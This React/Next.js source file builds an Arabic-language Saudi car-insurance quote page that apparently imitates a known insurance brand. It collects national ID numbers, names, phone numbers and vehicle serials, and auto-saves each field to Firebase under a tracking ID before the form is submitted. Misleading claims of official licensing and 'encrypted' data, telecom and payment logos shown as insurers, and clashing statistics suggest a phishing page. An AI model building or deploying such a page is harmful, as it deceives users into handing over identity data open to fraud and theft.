"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  getOrCreateVisitorID,
  initializeVisitorTracking,
  updateVisitorPage,
} from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import { useAutoSave } from "@/hooks/use-auto-save";
import {
  RefreshCw,
  Loader2,
  Car,
  Stethoscope,
  ShieldAlert,
  Plane,
  ShieldCheck,
  BadgeCheck,
  Phone,
  MessageCircle,
  ChevronDown,
  Instagram,
  Youtube,
  X,
  Star,
  Clock,
  Building2,
  Users,
  HeadphonesIcon,
  CheckCircle2,
  ArrowLeft,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  if (!/^[12]/.test(cleanId)) return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
  }
  if (sum % 10 !== 0) return { valid: false, error: "رقم الهوية غير صحيح" };
  return { valid: true, error: "" };
}

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [activeTab, setActiveTab] = useState("مركبات");
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([]);
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [selectedVehicle, setSelectedVehicle] = useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);
  const [visitorInitialized, setVisitorInitialized] = useState(false);

  useEffect(() => {
    if (!visitorID) return;
    const init = async () => {
      await initializeVisitorTracking(visitorID);
      await updateVisitorPage(visitorID, "home-new", 1);
      setVisitorInitialized(true);
    };
    init();
  }, [visitorID]);

  useAutoSave({
    visitorId: visitorInitialized ? visitorID : "",
    pageName: "home",
    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, activeTab },
  });

  const fetchVehicles = useCallback(async (nin: string) => {
    const validation = validateSaudiId(nin);
    if (!validation.valid) { setVehicleOptions([]); return; }
    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();
      if (data.success && data.vehicles?.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map((v: any) => ({
          value: v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
          label: `${v.sequenceNumber || v.SequenceNumber || ""} - ${v.vehicleMaker || v.VehicleMaker || ""} ${v.vehicleModel || v.VehicleModel || ""} ${v.modelYear || v.ModelYear || ""}`.trim(),
          vehicle: v,
        }));
        setVehicleOptions(options);
        setSerialFieldFocused(true);
      }
    } catch (e) { console.error(e); } finally { setIsLoadingVehicles(false); }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) fetchVehicles(identityNumber);
    else { setVehicleOptions([]); setSelectedVehicle(null); }
  }, [identityNumber, fetchVehicles]);

  const refreshCaptcha = () => { setCaptchaCode(generateCaptcha()); setCaptchaInput(""); setCaptchaError(false); };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const v = validateSaudiId(identityNumber);
    if (!v.valid) { setIdentityNumberError(v.error); return; }
    if (captchaInput !== captchaCode) { setCaptchaError(true); return; }
    setSubmitting(true);
    try {
      localStorage.setItem("homeFormData", JSON.stringify({ identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, activeTab, selectedVehicle, timestamp: new Date().toISOString() }));
      await addData({ id: visitorID, identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName: insuranceType === "نقل ملكية" ? buyerName : "", buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "", activeTab, selectedVehicle: selectedVehicle ? { value: selectedVehicle.value, label: selectedVehicle.label } : null, currentStep: 2, currentPage: "insur" });
    } catch (e) { console.error(e); }
    router.push("/insur");
  };

  const productTabs = [
    { label: "مركبات", icon: Car },
    { label: "طبي", icon: Stethoscope },
    { label: "أخطاء طبية", icon: ShieldAlert },
    { label: "سفر", icon: Plane },
  ];

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">

      {/* ─── Header ──────────────────────────────────── */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-40">
        <div className="max-w-md mx-auto flex items-center justify-between px-4 py-3">
          {/* Logo */}
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded-lg bg-[#1a5676] flex items-center justify-center">
              <Car className="w-4 h-4 text-white" />
            </div>
            <span className="text-base font-black text-[#1a5676] tracking-tight">بي كير</span>
          </div>
          {/* Actions */}
          <div className="flex items-center gap-2">
            <button className="text-xs font-bold text-slate-500 border border-slate-200 rounded-lg px-2.5 py-1.5 hover:bg-slate-50">EN</button>
            <div className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center">
              <Users className="w-4 h-4 text-slate-500" />
            </div>
          </div>
        </div>
      </header>

      {/* ─── Hero ────────────────────────────────────── */}
      <section className="bg-gradient-to-bl from-[#0e3a57] via-[#1a5676] to-[#1e6b94] text-white">
        <div className="max-w-md mx-auto px-5 pt-8 pb-6 text-center space-y-3">
          <span className="inline-flex items-center gap-1.5 bg-white/15 backdrop-blur-sm text-white text-[11px] font-semibold px-3 py-1.5 rounded-full border border-white/20">
            <CheckCircle2 className="w-3 h-3 text-[#f4ad27]" />
            منصة مرخصة ومعتمدة رسمياً
          </span>
          <h1 className="text-2xl font-black leading-snug">
            أمّن مركبتك بأفضل
            <br />
            <span className="text-[#f4ad27]">عروض التأمين</span>
            {" "}في السعودية
          </h1>
          <p className="text-sm text-white/70 leading-relaxed max-w-xs mx-auto">
            قارن عروض أكثر من 25 شركة تأمين واحصل على أفضل سعر في أقل من 3 دقائق
          </p>
        </div>

        {/* Stat cards — float over section break */}
        <div className="max-w-md mx-auto px-4 pb-0">
          <div className="grid grid-cols-3 gap-2 bg-white rounded-t-2xl p-3 shadow-lg">
            {[
              { value: "100%", label: "رضى العملاء", icon: Star, color: "text-amber-500 bg-amber-50" },
              { value: "3", label: "دقائق فقط", icon: Clock, color: "text-blue-600 bg-blue-50" },
              { value: "+25", label: "شركة تأمين", icon: Building2, color: "text-green-600 bg-green-50" },
            ].map(({ value, label, icon: Icon, color }) => (
              <div key={label} className="flex flex-col items-center gap-1 py-1">
                <div className={`w-7 h-7 rounded-lg flex items-center justify-center ${color}`}>
                  <Icon className="w-3.5 h-3.5" />
                </div>
                <span className="text-lg font-black text-slate-800">{value}</span>
                <span className="text-[10px] font-semibold text-slate-500 text-center leading-3">{label}</span>
              </div>
            ))}
          </div>
        </div>
      </section>

      <div className="max-w-md mx-auto px-4 space-y-4 pb-8">

        {/* ─── Form card ───────────────────────────────── */}
        <div className="bg-white rounded-b-2xl rounded-t-none shadow-lg border border-t-0 border-slate-100 overflow-hidden">

          {/* Product type tabs */}
          <div className="grid grid-cols-4 bg-slate-50 border-b border-slate-100">
            {productTabs.map(({ label, icon: Icon }) => (
              <button
                key={label}
                type="button"
                onClick={() => setActiveTab(label)}
                className={`flex flex-col items-center gap-1 py-3 text-[10px] font-bold transition-all ${
                  activeTab === label
                    ? "bg-white text-[#1a5676] border-b-2 border-[#1a5676] shadow-sm"
                    : "text-slate-400 hover:text-slate-600"
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                {label}
              </button>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="p-4 space-y-4">

            {/* Insurance type */}
            <div className="flex rounded-xl overflow-hidden border border-slate-200 bg-slate-50 p-1 gap-1">
              {["تأمين جديد", "نقل ملكية"].map((type) => (
                <button
                  key={type}
                  type="button"
                  onClick={() => setInsuranceType(type)}
                  className={`flex-1 h-9 rounded-lg text-sm font-bold transition-all ${
                    insuranceType === type
                      ? "bg-[#1a5676] text-white shadow-sm"
                      : "text-slate-500 hover:text-[#1a5676]"
                  }`}
                >
                  {type}
                </button>
              ))}
            </div>

            {/* Fields */}
            {[
              { label: "رقم الهوية / الإقامة", placeholder: "رقم الهوية / الإقامة", value: identityNumber, onChange: (v: string) => { setIdentityNumber(v.replace(/\D/g,"").slice(0,10)); if(identityNumberError) setIdentityNumberError(""); }, type: "tel", error: identityNumberError, loading: isLoadingVehicles },
              { label: "اسم المالك", placeholder: "الاسم الكامل", value: ownerName, onChange: (v: string) => setOwnerName(v), type: "text" },
              { label: "رقم الجوال", placeholder: "05xxxxxxxx", value: phoneNumber, onChange: (v: string) => { const c = v.replace(/\D/g,""); setPhoneNumber(c.startsWith("05") ? c.slice(0,10) : c.slice(0,10)); }, type: "tel" },
            ].map(({ label, placeholder, value, onChange, type, error, loading }) => (
              <div key={label} className="space-y-1.5">
                <label className="block text-xs font-semibold text-slate-600">{label}</label>
                <div className="relative">
                  <Input
                    type={type}
                    inputMode={type === "tel" ? "numeric" : undefined}
                    placeholder={placeholder}
                    value={value}
                    onChange={(e) => onChange(e.target.value)}
                    className={`h-11 rounded-xl border-2 text-sm text-right transition-colors ${error ? "border-red-400 focus:border-red-500" : "border-slate-200 focus:border-[#1a5676]"}`}
                    dir="rtl"
                    required
                  />
                  {loading && <Loader2 className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 animate-spin text-[#1a5676]" />}
                </div>
                {error && <p className="text-xs text-red-600 font-medium">{error}</p>}
              </div>
            ))}

            {/* Transfer-specific fields */}
            {insuranceType === "نقل ملكية" && (
              <>
                <div className="space-y-1.5">
                  <label className="block text-xs font-semibold text-slate-600">اسم المشتري</label>
                  <Input placeholder="اسم المشتري الكامل" value={buyerName} onChange={(e) => setBuyerName(e.target.value)} className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right" dir="rtl" required />
                </div>
                <div className="space-y-1.5">
                  <label className="block text-xs font-semibold text-slate-600">رقم هوية المشتري</label>
                  <Input type="tel" inputMode="numeric" placeholder="رقم هوية المشتري" value={buyerIdNumber} onChange={(e) => setBuyerIdNumber(e.target.value.replace(/\D/g,"").slice(0,10))} className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right" dir="rtl" required />
                </div>
              </>
            )}

            {/* Document type */}
            <div className="space-y-1.5">
              <label className="block text-xs font-semibold text-slate-600">نوع الوثيقة</label>
              <div className="flex rounded-xl overflow-hidden border border-slate-200 bg-slate-50 p-1 gap-1">
                {["استمارة", "بطاقة جمركية"].map((t) => (
                  <button key={t} type="button" onClick={() => setDocumentType(t)}
                    className={`flex-1 h-9 rounded-lg text-xs font-bold transition-all ${documentType === t ? "bg-[#1a5676] text-white shadow-sm" : "text-slate-500 hover:text-[#1a5676]"}`}>
                    {t}
                  </button>
                ))}
              </div>
            </div>

            {/* Serial number */}
            <div className="space-y-1.5">
              <label className="block text-xs font-semibold text-slate-600">
                {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
              </label>
              <div className="relative">
                <Input
                  type="tel" inputMode="numeric"
                  placeholder={documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
                  value={serialNumber}
                  onChange={(e) => { setSerialNumber(e.target.value.replace(/\D/g,"")); setSelectedVehicle(null); }}
                  onFocus={() => { if (vehicleOptions.length > 0) setSerialFieldFocused(true); }}
                  onBlur={() => { setTimeout(() => setSerialFieldFocused(false), 200); }}
                  className="h-11 rounded-xl border-2 border-slate-200 focus:border-[#1a5676] text-sm text-right"
                  dir="rtl" required
                />
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button type="button" className="absolute left-3 top-1/2 -translate-y-1/2" onClick={() => setSerialFieldFocused(!serialFieldFocused)}>
                    <ChevronDown className={`h-4 w-4 text-[#1a5676] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="rounded-xl bg-blue-50 border border-blue-100 px-3 py-2" dir="rtl">
                  <p className="text-[10px] text-blue-500 font-medium">المركبة المختارة</p>
                  <p className="text-sm font-semibold text-slate-700 mt-0.5">{selectedVehicle.label}</p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div className="absolute z-50 mt-1 w-full max-w-[calc(100%-2rem)] rounded-xl border border-slate-200 bg-white shadow-xl overflow-hidden" dir="rtl">
                  <div className="max-h-48 overflow-y-auto divide-y divide-slate-50">
                    {vehicleOptions.map((opt) => (
                      <button key={opt.value} type="button"
                        className={`w-full px-4 py-3 text-right text-sm hover:bg-slate-50 transition-colors ${serialNumber === opt.value ? "bg-blue-50 text-[#1a5676] font-bold" : "text-slate-700"}`}
                        onMouseDown={(e) => { e.preventDefault(); setSerialNumber(opt.value); setSelectedVehicle(opt); setSerialFieldFocused(false); }}>
                        {opt.label}
                      </button>
                    ))}
                  </div>
                  <button type="button" className="w-full px-4 py-2.5 text-center text-xs text-slate-400 hover:bg-slate-50 border-t border-slate-100"
                    onMouseDown={(e) => { e.preventDefault(); setSerialFieldFocused(false); setSerialNumber(""); setSelectedVehicle(null); }}>
                    إدخال رقم يدوي
                  </button>
                </div>
              )}
            </div>

            {/* Captcha */}
            <div className="rounded-xl bg-slate-50 border border-slate-200 p-3 space-y-2">
              <label className="block text-xs font-semibold text-slate-600">رمز التحقق</label>
              <div className="flex items-center gap-2">
                <div className="flex items-center gap-1.5 bg-white rounded-xl border border-slate-200 px-3 py-2" dir="ltr">
                  {captchaCode.split("").map((d, i) => (
                    <span key={i} className={`text-xl font-black select-none ${i % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"}`}>{d}</span>
                  ))}
                  <button type="button" onClick={refreshCaptcha} className="mr-1 p-1.5 bg-[#1a5676] rounded-lg text-white hover:bg-[#154a6d]">
                    <RefreshCw className="h-3 w-3" />
                  </button>
                </div>
                <Input
                  placeholder="أدخل الرمز"
                  value={captchaInput}
                  onChange={(e) => { setCaptchaInput(e.target.value); if (captchaError) setCaptchaError(false); }}
                  className={`flex-1 h-11 rounded-xl border-2 text-sm ${captchaError ? "border-red-400" : "border-slate-200 focus:border-[#1a5676]"}`}
                  dir="rtl" required
                />
              </div>
              {captchaError && <p className="text-xs text-red-600 font-medium">رمز التحقق غير صحيح، حاول مرة أخرى</p>}
            </div>

            {/* Submit */}
            <Button
              type="submit"
              disabled={submitting}
              className="h-13 w-full rounded-xl text-sm font-extrabold bg-[#f4ad27] hover:bg-[#e09a18] text-[#1a3d52] shadow-md shadow-amber-100 transition-all"
            >
              {submitting
                ? <Loader2 className="h-5 w-5 animate-spin mx-auto" />
                : <span className="flex items-center justify-center gap-2">احصل على عرضك الآن <ArrowLeft className="h-4 w-4" /></span>
              }
            </Button>
            <p className="text-center text-[10px] text-slate-400">🔒 بياناتك مشفرة ومحمية بالكامل</p>
          </form>
        </div>

        {/* ─── Trust / Why us ─────────────────────────── */}
        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4">
          <h2 className="text-sm font-black text-slate-800 text-center mb-3">
            لماذا يختار أكثر من <span className="text-[#1a5676]">500,000</span> عميل بي كير؟
          </h2>
          <div className="grid grid-cols-2 gap-2.5">
            {[
              { icon: Star, title: "تقييم 4.9/5", sub: "من آلاف العملاء الراضين", bg: "bg-amber-50 text-amber-500" },
              { icon: ShieldCheck, title: "أمان وموثوقية", sub: "مرخص من الجهات الرسمية", bg: "bg-blue-50 text-blue-600" },
              { icon: HeadphonesIcon, title: "دعم 24/7", sub: "فريق متخصص دائماً متاح", bg: "bg-green-50 text-green-600" },
              { icon: BadgeCheck, title: "أفضل الأسعار", sub: "نقارن لك من +25 شركة", bg: "bg-purple-50 text-purple-600" },
            ].map(({ icon: Icon, title, sub, bg }) => (
              <div key={title} className="flex items-start gap-2.5 bg-slate-50 rounded-xl p-3">
                <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${bg}`}>
                  <Icon className="w-4 h-4" />
                </div>
                <div>
                  <p className="text-xs font-bold text-slate-800">{title}</p>
                  <p className="text-[10px] text-slate-500 leading-4 mt-0.5">{sub}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* ─── Company logos ───────────────────────────── */}
        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 p-4">
          <p className="text-xs font-bold text-slate-500 text-center mb-3">شركات التأمين المعتمدة</p>
          <div className="grid grid-cols-4 gap-2">
            {["/stc.png", "/Mobily_Logo.svg", "/mada.svg", "/tan.svg", "/mas.svg", "/sxs.svg", "/rhj.png", "/NIC-logo.png"].map((src, i) => (
              <div key={i} className="h-10 bg-slate-50 rounded-xl border border-slate-100 flex items-center justify-center p-1.5">
                <img src={src} alt="" className="max-h-full max-w-full object-contain opacity-70 hover:opacity-100 transition-opacity" onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
              </div>
            ))}
          </div>
        </div>

        {/* ─── Help CTA ────────────────────────────────── */}
        <div className="rounded-2xl overflow-hidden shadow-sm">
          <div className="bg-gradient-to-bl from-[#0e3a57] to-[#1a5676] p-5 text-white text-center space-y-3">
            <p className="text-sm font-bold">هل تحتاج مساعدة؟</p>
            <p className="text-[11px] text-white/65 leading-relaxed max-w-xs mx-auto">
              فريق خبرائنا متاح لمساعدتك في اختيار أفضل خطة تأمين تناسبك
            </p>
            <div className="grid grid-cols-2 gap-2 pt-1">
              <a href="tel:920000000" className="flex items-center justify-center gap-2 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl py-3 text-xs font-bold transition-all">
                <Phone className="h-4 w-4 text-[#f4ad27]" /> اتصل بنا
              </a>
              <a href="#" className="flex items-center justify-center gap-2 bg-[#f4ad27] hover:bg-[#e09a18] rounded-xl py-3 text-xs font-black text-[#1a3d52] transition-all shadow-md">
                <MessageCircle className="h-4 w-4" /> واتساب
              </a>
            </div>
          </div>
          <div className="bg-white border border-t-0 border-slate-100 grid grid-cols-3 divide-x divide-x-reverse divide-slate-100">
            {[["98%", "رضى العملاء"], ["24/7", "خدمة مستمرة"], ["-30د", "متوسط الإتمام"]].map(([val, lbl]) => (
              <div key={lbl} className="py-3 text-center">
                <p className="text-sm font-black text-[#1a5676]">{val}</p>
                <p className="text-[10px] text-slate-500 font-medium mt-0.5">{lbl}</p>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* ─── Footer ──────────────────────────────────── */}
      <footer className="bg-[#0c3a52] text-white">
        <div className="max-w-md mx-auto px-4 pt-6 pb-5">
          <div className="flex items-center justify-between mb-5">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-lg bg-[#f4ad27] flex items-center justify-center">
                <Car className="w-4 h-4 text-[#1a3d52]" />
              </div>
              <div>
                <p className="text-sm font-black">بي كير</p>
                <p className="text-[10px] text-white/50">منصة التأمين الذكية</p>
              </div>
            </div>
            <a href="tel:8001180044" className="flex items-center gap-1.5 bg-white/10 rounded-xl px-3 py-2">
              <Phone className="h-3.5 w-3.5 text-[#f4ad27]" />
              <span className="text-xs font-bold">8001180044</span>
            </a>
          </div>

          <div className="grid grid-cols-2 gap-4 border-t border-white/10 pt-4 mb-4">
            {[
              { title: "الخدمات", links: ["تأمين السيارات", "تأمين طبي", "تأمين سفر", "إدارة الوثيقة"] },
              { title: "الدعم", links: ["مركز المساعدة", "اتصل بنا", "الشروط والأحكام", "الخصوصية"] },
            ].map(({ title, links }) => (
              <div key={title}>
                <p className="text-[10px] font-bold text-white/40 uppercase tracking-widest mb-2.5">{title}</p>
                {links.map((l) => (
                  <button key={l} type="button" className="block text-[11px] text-white/65 hover:text-white py-1 transition-colors">{l}</button>
                ))}
              </div>
            ))}
          </div>

          <div className="flex items-center justify-between border-t border-white/10 pt-4">
            <p className="text-[10px] text-white/40">© 2024 بي كير. جميع الحقوق محفوظة.</p>
            <div className="flex gap-2">
              {[Instagram, X, Youtube].map((Icon, i) => (
                <span key={i} className="w-7 h-7 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center cursor-pointer transition-colors">
                  <Icon className="h-3.5 w-3.5" />
                </span>
              ))}
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
